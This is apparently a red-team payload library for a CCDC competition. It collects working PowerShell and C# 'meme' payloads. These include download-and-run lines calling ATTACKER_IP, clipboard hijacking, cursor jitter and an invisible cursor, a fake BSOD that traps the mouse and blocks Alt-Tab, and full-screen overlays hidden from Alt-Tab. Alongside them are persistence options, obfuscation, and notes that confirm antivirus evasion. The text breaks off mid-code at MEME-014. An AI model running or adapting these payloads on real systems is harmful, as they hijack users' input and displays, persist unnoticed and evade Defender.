# ADS Meme Payload Library

Cheeky, visible-impact payloads for competition environments — earns style points while proving access.

> **Validation status is tracked per-payload below.**
> MEME-001, 003, 007 are still unvalidated. MEME-002, 004, 005, 006 were VM-tested
> on 2026-02-19 (Win11 Build 26200, PS 5.1, Defender SigV 1.445.152.0, RTP enabled).
>
> **Session context warnings:**
> - Payloads marked **INTERACTIVE ONLY** require a logged-in user session (Session 1+).
>   They are **invisible** when run from SYSTEM via Task Scheduler (Session 0).
>   Use `-Persist registry` for guaranteed user-session delivery — the Run key fires
>   in the user's own logon session. `-Persist task -Trigger AtLogOn` runs as SYSTEM
>   in Session 0 and will NOT show windows/effects to the logged-in user.
> - Payloads marked **SYSTEM OK** work from any session.
>
> **Parameter reminders:**
> - Zero-width stream names are enabled via `-Obfuscate Advanced` or `-Obfuscate Paranoid`.
> - `-Encrypt` — BUG-011 is **FIXED** (Session 12-14) pending full VM validation. The
>   `_wrapEC` / `-EncodedCommand` fix prevents ClickFix.TFC at execution time. T1-v2 and
>   T4-v2 (unencrypted) confirmed PASS in Session 15. T3-v2 and T11-v2 (encrypted) need
>   re-run with fixed runbook. See `tests/RT4-BUG011-EXECTIME.md` for test status.

---

## MEME-001: Desktop Goose Flock Deployment
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — requires pre-staged binary

The goose deserves a proper flock. This downloads and launches multiple goose instances
that honk, drag windows around, and leave muddy footprints.

```powershell
# MEME-001: Goose Flock — downloads Desktop Goose and launches N instances
# NOTE: Requires interactive session. Deploy via -Persist registry for user-session execution.
$n=3; $gooseUrl='http://ATTACKER_IP:8080/GooseDesktop.exe'
$gooseDir="$env:APPDATA\WindowsGoose"
if(!(Test-Path $gooseDir)){New-Item $gooseDir -ItemType Directory -Force|Out-Null}
$goosePath="$gooseDir\GooseDesktop.exe"
if(!(Test-Path $goosePath)){(New-Object Net.WebClient).DownloadFile($gooseUrl,$goosePath)}
1..$n|ForEach-Object{Start-Process $goosePath -WindowStyle Normal}
```

Pre-stage note: Host `GooseDesktop.exe` on your attack box. The goose binary is open source.
For maximum hilarity, set `InstanceCount 5` so each box gets 5 independent persistence mechanisms,
each launching 3 geese. That's 15 geese per host.

---

## MEME-002: Wall of Notepads (Cascading Window Flood)
**Session:** INTERACTIVE ONLY
**Status:** VALIDATED ✓ — M4 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed (10 notepads created on first fire).

> **AtLogOn delivery caveat (confirmed by field test):** Scheduled tasks run as SYSTEM (Session 0).
> Notepad processes launched in Session 0 are invisible to the user desktop.
> For guaranteed user-session delivery, use **`-Persist registry`** — the registry Run key
> fires in the user's own logon session. M4 field test confirmed: "Did NOT work after
> logout/login" when deployed with `-Persist task -Trigger AtLogOn`.

```powershell
# MEME-002: Opens 10 notepads in a cascading pattern, each with a message
# INTERACTIVE SESSION ONLY — use -Persist registry for reliable user-session delivery
$msg = "      _     `n     (o>    `n     //\    `n    V_/_    `n`nRed Team Was Here`nCCDC 2026"
1..10 | ForEach-Object {
    $f = "$env:TEMP\rt_$_.txt"; $msg | Out-File $f -Force
    Start-Process notepad $f; Start-Sleep -Milliseconds 200
}
```

Scale up `1..10` to `1..50` for maximum chaos in a real deployment. 10 is the safe test count.

---

## MEME-003: Rick Astley Background Service (Audio Rick Roll)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — requires pre-staged audio file

```powershell
# MEME-003: Downloads and plays Never Gonna Give You Up on loop
# INTERACTIVE SESSION ONLY — no audio device in Session 0
$mp3 = "$env:APPDATA\update_check.mp3"
if(!(Test-Path $mp3)){(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/rick.mp3',$mp3)}
Add-Type -AssemblyName presentationCore
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open([uri]"file:///$($mp3 -replace '\\','/')")
$player.Play()
Start-Sleep -Seconds 212  # Full song length
```

---

## MEME-004: The Matrix Rain (Persistent Console Effect)
**Session:** SYSTEM OK (creates its own console window)
**Status:** VALIDATED ✓ — M3 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed ("window visible — nostalgic").

> **Time-limited for competition safety:** Runs for 2 minutes then exits cleanly.
> Infinite-loop versions accumulate multiple processes when the task fires on each interval.
> Scale up `AddMinutes(2)` for longer effect.

```powershell
# MEME-004: Spawns a PowerShell that creates a Matrix rain console window
# SYSTEM OK — creates its own console. Time-limited to 2 min for competition safety.
$matrix = @'
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Green"
Clear-Host
$w = $host.UI.RawUI.WindowSize.Width
$drops = @{}
$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()"
$end = [DateTime]::Now.AddMinutes(2)
while([DateTime]::Now -lt $end){
    $col = Get-Random -Maximum $w
    $drops[$col] = 0
    foreach($c in @($drops.Keys)){
        $y = $drops[$c]
        if($y -lt $host.UI.RawUI.WindowSize.Height){
            $host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates($c,$y)
            Write-Host $chars[(Get-Random -Maximum $chars.Length)] -NoNewline -ForegroundColor Green
            $drops[$c]++
        } else { $drops.Remove($c) }
    }
    Start-Sleep -Milliseconds 50
}
'@
$f = "$env:ProgramData\sysmon_diag.ps1"; $matrix | Out-File $f -Force
Start-Process powershell -ArgumentList "-NoProfile -File `"$f`"" -WindowStyle Normal
```

---

## MEME-005: Caps Lock Disco (Blinks Caps/Num/Scroll Lock LEDs)
**Session:** SYSTEM OK (targets system keyboard buffer)
**Status:** VALIDATED ✓ — M2 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed (LEDs blinked). Terminal visible when task fired manually — hidden when
triggered automatically by scheduler (expected behavior).

> **Recommended: use the time-limited variant below** — Infinite loop accumulates multiple
> processes if the task fires on each periodic interval.

```powershell
# MEME-005 (RECOMMENDED): Time-limited Caps Lock disco — 60 seconds, then exits cleanly
$wsh = New-Object -ComObject WScript.Shell
$end = (Get-Date).AddSeconds(60)
while((Get-Date) -lt $end){
    $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 400
}
```

```powershell
# MEME-005 (AGGRESSIVE): Infinite loop — only safe with -Persist none (one-shot delivery)
$wsh = New-Object -ComObject WScript.Shell
while($true){
    $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 200
    $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 200
    $wsh.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 200
}
```

---

## MEME-006: Clipboard Rickroll (Replaces clipboard contents periodically)
**Session:** SYSTEM OK
**Status:** VALIDATED ✓ — M1 test, 2026-02-19 (Win11/26200). DEPLOY=OK, DEFENDER=CLEAN.
Effect confirmed (clipboard replaced with rickroll text). Terminal visible when task fired
manually — hidden when triggered automatically by scheduler (expected behavior).

```powershell
# MEME-006: Every 30 seconds, replaces clipboard with rickroll lyrics
# Works from SYSTEM — clipboard is shared across sessions on same desktop
while($true){
    Set-Clipboard "Never gonna give you up, never gonna let you down. Red Team <3 CCDC 2026"
    Start-Sleep -Seconds 30
}
```

---

## MEME-007: Cursor Earthquake (Subtle mouse jitter)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED

```powershell
# MEME-007: Adds tiny random jitter to mouse position every 2 seconds
# Subtle enough to drive someone crazy before they realize it's not their mouse
Add-Type -AssemblyName System.Windows.Forms
while($true){
    $p = [System.Windows.Forms.Cursor]::Position
    $dx = Get-Random -Minimum -3 -Maximum 4
    $dy = Get-Random -Minimum -3 -Maximum 4
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($p.X+$dx),($p.Y+$dy))
    Start-Sleep -Seconds 2
}
```

---

## MEME-008: OIIA Spinning Proof-of-Compromise
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new in Session 15

Tribute to the OIIA spinning cat meme. Spawns a visible PowerShell console showing a
spinning ASCII cat animation cycling through 4 frames, alongside live recon: hostname,
username, privilege level, local admin count, and timestamp. Runs for 30 seconds then
exits cleanly. Proof-of-compromise that blue team will actually see.

> **Deploy with `-Persist registry`** — Run key fires in user's own logon session where
> console windows are visible. `-Persist task -Trigger AtLogOn` runs as SYSTEM in
> Session 0 — the window spawns there and is invisible to the interactive user.

```powershell
# MEME-008: OIIA Spinning Proof-of-Compromise
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
# Spawns a separate visible console window; parent script exits immediately
$oiia = @'
$frames = @(
    @("  /\_/\ ","  (^o.o^)","   > ^ < ","  oiia~  "),
    @("  /\_/\ ","  ( -.- )","   > ^ < ","  ~oi    "),
    @("  /\_/\ ","  (^o.o^)","   < ^ < ","   ~oiia "),
    @("  /\_/\ ","  (~.-~) ","   < ^ < ","  oi~    "))
$adm = try { (Get-LocalGroupMember Administrators -EA 0).Count } catch { 0 }
$pv = @{$true = "ELEVATED"; $false = "Standard"}[
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)]
$recon = @(
    "",
    "  Host    : $(hostname)",
    "  User    : $(whoami)",
    "  Privs   : $pv",
    "  Admins  : $adm local administrator account(s)",
    "  Time    : $([DateTime]::Now.ToString('HH:mm:ss'))",
    "",
    "  [Apparition - Red Team CCDC 2026]",
    "")
$end = [DateTime]::Now.AddSeconds(30)
$host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
while ([DateTime]::Now -lt $end) {
    foreach ($g in $frames) {
        if ([DateTime]::Now -ge $end) { break }
        Clear-Host
        Write-Host "`n  ~~ OIIA OIIA OIIA ~~" -ForegroundColor Magenta
        $g | ForEach-Object { Write-Host "  $_" -ForegroundColor Cyan }
        $recon | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
        $left = ($end - [DateTime]::Now).Seconds
        Write-Host "  [oiia-ing for ${left}s...]" -ForegroundColor DarkGray
        Start-Sleep -Milliseconds 220
    }
}
Clear-Host
'@
$f = "$env:ProgramData\oiia_diag.ps1"
$oiia | Out-File $f -Force -Encoding UTF8
Start-Process powershell -ArgumentList "-NoProfile -File `"$f`"" -WindowStyle Normal
```

---

## MEME-009: OIIA Desktop Graffiti
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 15

Drops a persistent text file containing ASCII OIIA cat art + live proof-of-compromise
info (hostname, user, timestamp, privilege level) to the user's Desktop, Public Desktop,
and Temp directory. Named `OIIA_RED_TEAM_WAS_HERE.txt` — immediately visible in File
Explorer on next logon. File persists until explicitly deleted. No UI, no windows.
Works from SYSTEM in Session 0.

```powershell
# MEME-009: OIIA Desktop Graffiti — persistent file drop
# SYSTEM OK — works from Task Scheduler, no interactive session needed
# Drops proof-of-compromise file to Desktop, Public Desktop, and Temp
$adm = try { (Get-LocalGroupMember Administrators -EA 0).Count } catch { "?" }
$pv = @{$true = "ELEVATED"; $false = "Standard"}[
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)]
$art = @"
  /\_/\    oiia oiia oiia oiia oiia
  (o.o )   ~~~ OIIA RED TEAM ~~~
  > ^ <
 (       )
  \_/_\_/

  PROOF OF COMPROMISE
  ===================
  Host   : $(hostname)
  User   : $(whoami)
  Privs  : $pv
  Admins : $adm local administrator(s)
  Date   : $([DateTime]::Now)

  You have been visited by Apparition.
  oiia oiia oiia oiia oiia oiia oiia
"@
foreach ($p in @("$env:PUBLIC\Desktop", "$env:USERPROFILE\Desktop", "$env:TEMP")) {
    $art | Out-File "$p\OIIA_RED_TEAM_WAS_HERE.txt" -Force -EA 0
}
```

---

## MEME-010: Washing Machine (Screen Spin Overlay)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new for Finals

Captures a screenshot of the desktop and overlays it as a fullscreen topmost form that spins
continuously at ~30fps. Hidden from Alt-Tab via WS_EX_TOOLWINDOW. The screen literally rotates.
Kill switch: Ctrl+Shift+Q.

> **Deploy with `-Persist registry`** — Run key fires in user's own logon session.
```powershell
# MEME-010: Washing Machine — spins the captured desktop at 30fps
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$code = @"
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace WashingMachine {
    public class SpinForm : Form {
        [DllImport("user32.dll")]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TOOLWINDOW = 0x00000080;

        private Timer spinTimer;
        private Bitmap screenCap;
        private float currentAngle = 0f;
        private float spinSpeed = 3f;

        public SpinForm() {
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Normal;
            this.StartPosition = FormStartPosition.Manual;
            this.ShowInTaskbar = false;
            this.DoubleBuffered = true;
            this.TopMost = true;
            this.Cursor = Cursors.Default;

            Rectangle total = Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens)
                total = Rectangle.Union(total, s.Bounds);
            this.Bounds = total;

            screenCap = new Bitmap(total.Width, total.Height);
            using (Graphics g = Graphics.FromImage(screenCap))
                g.CopyFromScreen(total.Location, Point.Empty, total.Size);

            int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
            SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002);

            spinTimer = new Timer();
            spinTimer.Interval = 33;
            spinTimer.Tick += (s, e) => { currentAngle = (currentAngle + spinSpeed) % 360f; this.Invalidate(); };
            spinTimer.Start();
        }

        protected override void OnPaint(PaintEventArgs e) {
            Graphics g = e.Graphics;
            g.Clear(Color.Black);
            g.InterpolationMode = InterpolationMode.Low;
            g.SmoothingMode = SmoothingMode.HighSpeed;
            float cx = this.Width / 2f;
            float cy = this.Height / 2f;
            g.TranslateTransform(cx, cy);
            g.RotateTransform(currentAngle);
            float scale = 1.5f;
            g.ScaleTransform(scale, scale);
            g.DrawImage(screenCap, -cx, -cy, this.Width, this.Height);
        }

        protected override void OnKeyDown(KeyEventArgs e) {
            if (e.Control && e.Shift && e.KeyCode == Keys.Q) { spinTimer.Stop(); this.Close(); }
            base.OnKeyDown(e);
        }

        protected override CreateParams CreateParams {
            get { CreateParams cp = base.CreateParams; cp.ExStyle |= WS_EX_TOOLWINDOW; return cp; }
        }
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms, System.Drawing -ErrorAction Stop
$form = New-Object WashingMachine.SpinForm
[System.Windows.Forms.Application]::Run($form)
```

---

## MEME-011: Screen Earthquake
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new for Finals

Same screenshot-overlay trick as the Washing Machine but shakes violently at ±25px random
offsets at 60fps instead of rotating. The entire OS appears to seize. Kill switch: Ctrl+Shift+Q.

> **Deploy with `-Persist registry`**.
```powershell
# MEME-011: Screen Earthquake — violent pixel-shake at 60fps
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$code = @"
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Earthquake {
    public class ShakeForm : Form {
        [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TOOLWINDOW = 0x00000080;

        private Timer quakeTimer;
        private Bitmap screenCap;
        private Random rng = new Random();
        private int intensity = 25;

        public ShakeForm() {
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.DoubleBuffered = true;
            this.TopMost = true;

            Rectangle total = Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens) total = Rectangle.Union(total, s.Bounds);
            this.Bounds = total;

            screenCap = new Bitmap(total.Width, total.Height);
            using (Graphics g = Graphics.FromImage(screenCap))
                g.CopyFromScreen(total.Location, Point.Empty, total.Size);

            int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
            SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002);

            quakeTimer = new Timer();
            quakeTimer.Interval = 16;
            quakeTimer.Tick += (s, e) => this.Invalidate();
            quakeTimer.Start();
        }

        protected override void OnPaint(PaintEventArgs e) {
            Graphics g = e.Graphics;
            g.Clear(Color.Black);
            int dx = rng.Next(-intensity, intensity + 1);
            int dy = rng.Next(-intensity, intensity + 1);
            g.DrawImage(screenCap, dx, dy, this.Width, this.Height);
        }

        protected override void OnKeyDown(KeyEventArgs e) {
            if (e.Control && e.Shift && e.KeyCode == Keys.Q) { quakeTimer.Stop(); this.Close(); }
            base.OnKeyDown(e);
        }

        protected override CreateParams CreateParams {
            get { CreateParams cp = base.CreateParams; cp.ExStyle |= WS_EX_TOOLWINDOW; return cp; }
        }
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms, System.Drawing -ErrorAction Stop
[System.Windows.Forms.Application]::Run((New-Object Earthquake.ShakeForm))
```

---

## MEME-012: Fake BSOD (GDI — pixel-perfect)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new for Finals (replaces MessageBox version in MEME-001 for actual impact)

Fullscreen pixel-perfect Blue Screen of Death rendered in GDI. Matches Windows 10/11 proportions.
Captures the mouse cursor, hides it via Win32 blank cursor, and uses a progress counter that
crawls to 99% and stops. Blocks Alt-Tab. Looks completely real. Kill switch: Ctrl+Shift+Q.

> **Deploy with `-Persist registry`**. Note the cursor clip — `Cursor.Clip = Rectangle.Empty`
> is called in the kill switch to release the mouse before closing.
```powershell
# MEME-012: Fake BSOD — pixel-perfect GDI fullscreen, cursor captured and hidden
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$code = @"
using System;
using System.Drawing;
using System.Drawing.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace DeepImpact {
    public class BSODForm : Form {
        [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll")] static extern IntPtr CreateCursor(IntPtr hInst, int xHotSpot, int yHotSpot, int nWidth, int nHeight, byte[] pvANDPlane, byte[] pvXORPlane);

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TOOLWINDOW = 0x00000080;

        private Timer progressTimer;
        private int pct = 0;
        private Random rng = new Random();

        public BSODForm() {
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.DoubleBuffered = true;
            this.BackColor = Color.FromArgb(0, 120, 215);

            byte[] andMask = new byte[] { 0xFF };
            byte[] xorMask = new byte[] { 0x00 };
            IntPtr hCur = CreateCursor(IntPtr.Zero, 0, 0, 1, 1, andMask, xorMask);
            if (hCur != IntPtr.Zero) this.Cursor = new Cursor(hCur);

            Rectangle total = Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens) total = Rectangle.Union(total, s.Bounds);
            this.Bounds = total;

            int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
            SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002);
            Cursor.Clip = this.Bounds;

            progressTimer = new Timer();
            progressTimer.Interval = 3000;
            progressTimer.Tick += (s, e) => {
                if (pct < 99) { pct += rng.Next(1, 8); if (pct > 99) pct = 99; this.Invalidate(); }
            };
            progressTimer.Start();
        }

        protected override void OnPaint(PaintEventArgs e) {
            Graphics g = e.Graphics;
            g.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
            g.Clear(Color.FromArgb(0, 120, 215));
            float scale = this.Height / 1080f;
            Brush white = Brushes.White;
            Font sadFont = new Font("Segoe UI Light", 120 * scale);
            g.DrawString(":(", sadFont, white, 180 * scale, 200 * scale);
            Font bigFont = new Font("Segoe UI Light", 28 * scale);
            g.DrawString("Your PC ran into a problem and needs to restart. We're", bigFont, white, 180 * scale, 450 * scale);
            g.DrawString("just collecting some error info, and then we'll restart for", bigFont, white, 180 * scale, 500 * scale);
            g.DrawString("you.", bigFont, white, 180 * scale, 550 * scale);
            Font pctFont = new Font("Segoe UI Light", 24 * scale);
            g.DrawString(pct + "% complete", pctFont, white, 180 * scale, 650 * scale);
            Font smallFont = new Font("Segoe UI Light", 14 * scale);
            g.DrawString("If you'd like to know more, you can search online later for this error:", smallFont, white, 180 * scale, 760 * scale);
            g.DrawString("Stop code: CRITICAL_PROCESS_DIED", smallFont, white, 180 * scale, 790 * scale);
            sadFont.Dispose(); bigFont.Dispose(); pctFont.Dispose(); smallFont.Dispose();
        }

        protected override void OnKeyDown(KeyEventArgs e) {
            if (e.Control && e.Shift && e.KeyCode == Keys.Q) {
                Cursor.Clip = Rectangle.Empty;
                progressTimer.Stop();
                this.Close();
            }
            base.OnKeyDown(e);
        }

        protected override CreateParams CreateParams {
            get { CreateParams cp = base.CreateParams; cp.ExStyle |= WS_EX_TOOLWINDOW; return cp; }
        }
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms, System.Drawing -ErrorAction Stop
[System.Windows.Forms.Application]::Run((New-Object DeepImpact.BSODForm))
```

---

## MEME-013: Invisible Cursor
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new for Finals

Replaces all 13 system cursor types (normal, I-beam, wait, resize handles, hand, etc.) with a
1x1 fully transparent icon via `SetSystemCursor`. Persists across all applications until logoff
or explicit restore. Blue team cannot see where they are clicking. Pairs devastatingly with
MEME-015 (Input Sabotage). Restore function included — keep it handy.

> **Deploy with `-Persist registry`**. Restore: `[CursorVanish.GhostCursor]::Restore()`
```powershell
# MEME-013: Invisible Cursor — replaces all 13 system cursors with transparent 1x1
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace CursorVanish {
    public class GhostCursor {
        [DllImport("user32.dll")] static extern bool SetSystemCursor(IntPtr hcur, uint id);
        [DllImport("user32.dll")] static extern IntPtr CopyIcon(IntPtr hIcon);

        static readonly uint[] cursorIds = {
            32512, 32513, 32514, 32515, 32516,
            32642, 32643, 32644, 32645, 32646,
            32648, 32649, 32650
        };

        public static string Vanish() {
            try {
                Bitmap bmp = new Bitmap(32, 32);
                for (int x = 0; x < 32; x++)
                    for (int y = 0; y < 32; y++)
                        bmp.SetPixel(x, y, Color.FromArgb(0, 0, 0, 0));
                IntPtr hIcon = bmp.GetHicon();
                int count = 0;
                foreach (uint id in cursorIds) {
                    IntPtr copy = CopyIcon(hIcon);
                    if (copy != IntPtr.Zero && SetSystemCursor(copy, id)) count++;
                }
                bmp.Dispose();
                return String.Format("Replaced {0}/{1} cursor types.", count, cursorIds.Length);
            } catch (Exception ex) { return "Error: " + ex.Message; }
        }

        [DllImport("user32.dll")] static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);

        public static string Restore() {
            SystemParametersInfo(0x0057, 0, IntPtr.Zero, 0);
            return "Cursors restored.";
        }
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing -ErrorAction Stop
[CursorVanish.GhostCursor]::Vanish()

# To restore:
# [CursorVanish.GhostCursor]::Restore()
```

---

## MEME-014: Nyan Cat (GDI Fullscreen)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new for Finals

Fullscreen Nyan Cat drawn entirely in GDI pixel art — no external assets. Cat bounces DVD-screensaver
style with a scrolling rainbow trail and twinkling stars. Running legs and wagging tail animated.
No external dependencies. Kill switch: Ctrl+Shift+Q.

> **Deploy with `-Persist registry`**.
```powershell
# MEME-014: Nyan Cat — fullscreen GDI pixel art, DVD-bounces with rainbow trail
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$code = @"
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace NyanImpact {
    public class NyanForm : Form {
        [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TOOLWINDOW = 0x00000080;

        private Timer animTimer;
        private float catX, catY;
        private float dx = 4f, dy = 3f;
        private int catW = 70, catH = 50;
        private float pixelScale = 4f;
        private List<PointF> trail = new List<PointF>();
        private int maxTrail = 200;
        private int frame = 0;

        private static readonly Color[] rainbow = {
            Color.FromArgb(255,0,0), Color.FromArgb(255,153,0), Color.FromArgb(255,255,0),
            Color.FromArgb(51,255,0), Color.FromArgb(0,153,255), Color.FromArgb(102,51,255)
        };
        private static readonly Color tart = Color.FromArgb(255,210,140);
        private static readonly Color tartEdge = Color.FromArgb(210,160,100);
        private static readonly Color pink = Color.FromArgb(255,153,204);
        private static readonly Color darkGray = Color.FromArgb(50,50,50);

        public NyanForm() {
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.DoubleBuffered = true;
            this.TopMost = true;
            this.BackColor = Color.FromArgb(0,51,102);

            Rectangle total = Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens) total = Rectangle.Union(total, s.Bounds);
            this.Bounds = total;

            int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
            SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002);

            catX = this.Width / 3f; catY = this.Height / 3f;

            animTimer = new Timer();
            animTimer.Interval = 33;
            animTimer.Tick += (s, e) => {
                frame++;
                catX += dx; catY += dy;
                float scaledW = catW * pixelScale; float scaledH = catH * pixelScale;
                if (catX + scaledW > this.Width || catX < 0) dx = -dx;
                if (catY + scaledH > this.Height || catY < 0) dy = -dy;
                trail.Add(new PointF(catX, catY + scaledH / 2f));
                if (trail.Count > maxTrail) trail.RemoveAt(0);
                this.Invalidate();
            };
            animTimer.Start();
        }

        protected override void OnPaint(PaintEventArgs e) {
            Graphics g = e.Graphics;
            g.Clear(Color.FromArgb(0,51,102));
            g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.None;
            float p = pixelScale;
            float bobOffset = (frame % 6 < 3) ? p : 0;

            if (trail.Count > 1) {
                float stripeH = (catH * p) / (rainbow.Length * 2);
                for (int i = 1; i < trail.Count; i++) {
                    float tx = trail[i].X; float ty = trail[i].Y;
                    float prevX = trail[i-1].X;
                    float segW = Math.Abs(tx - prevX) + p * 2;
                    float drawX = Math.Min(tx, prevX);
                    float waveOff = ((i % 4) < 2) ? p : 0;
                    for (int s = 0; s < rainbow.Length; s++) {
                        using (Brush b = new SolidBrush(Color.FromArgb(200 * i / trail.Count + 55, rainbow[s].R, rainbow[s].G, rainbow[s].B)))
                            g.FillRectangle(b, drawX, ty - (rainbow.Length / 2f - s) * stripeH + waveOff, segW, stripeH + 1);
                    }
                }
            }

            float cx = catX; float cy = catY + bobOffset;

            using (Brush tartBrush = new SolidBrush(tart))
            using (Brush edgeBrush = new SolidBrush(tartEdge))
            using (Brush pinkBrush = new SolidBrush(pink)) {
                g.FillRectangle(edgeBrush, cx+8*p, cy+4*p, 40*p, 32*p);
                g.FillRectangle(tartBrush, cx+10*p, cy+6*p, 36*p, 28*p);
                g.FillRectangle(pinkBrush, cx+12*p, cy+8*p, 32*p, 22*p);
                Color[] sprinkles = { Color.Red, Color.Yellow, Color.Cyan, Color.Magenta };
                int[,] sp = { {16,12},{22,10},{30,14},{36,10},{20,18},{28,20},{34,18},{18,24},{26,24},{38,22} };
                for (int i = 0; i < sp.GetLength(0); i++)
